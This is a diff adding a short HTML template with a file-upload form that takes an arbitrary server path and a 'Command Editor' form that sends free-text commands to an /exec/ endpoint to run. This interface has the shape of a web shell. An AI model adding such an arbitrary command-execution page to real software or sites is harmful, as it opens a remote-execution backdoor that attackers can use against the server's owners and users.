@@ -1,0 +1,19 @@
+<h1>Upload File</h1>
+
+<form enctype="multipart/form-data" action="/upload/" method="post">
+<input type="file" name="uploadfile" />
+<input type="text" name="path" value="input the path for upload" />
+<input type="submit" value="upuload" />  
+</form>
+
+<h1>Command Editor</h1>
+
+<form action="/exec/" method="POST">
+	<div>
+		<textarea name="body" rows="20" cols="80">input the command to run...</textarea>
+	</div>
+	<br>
+	<div>
+		<input type="submit" value="RUN">
+	</div>
+</form>
